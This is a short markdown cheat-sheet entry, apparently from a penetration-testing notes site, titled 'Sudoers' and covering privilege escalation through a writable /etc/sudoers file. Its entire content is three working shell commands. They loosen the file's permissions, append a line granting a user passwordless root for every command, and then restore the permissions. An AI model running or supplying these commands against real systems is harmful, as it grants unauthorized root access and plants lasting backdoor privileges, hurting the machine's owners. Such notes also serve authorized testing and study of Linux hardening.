---
title: "Sudoers"
date: 2024-7-3
tags: ["Sudoers", "Sudo", "Privilege Escalation", "/etc/sudoers"]
---

#### Abuse #1: Writable /etc/sudoers

```console
chmod 600 /etc/sudoers
```

```console
echo '<USER>   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

```console
chmod 440 /etc/sudoers
```
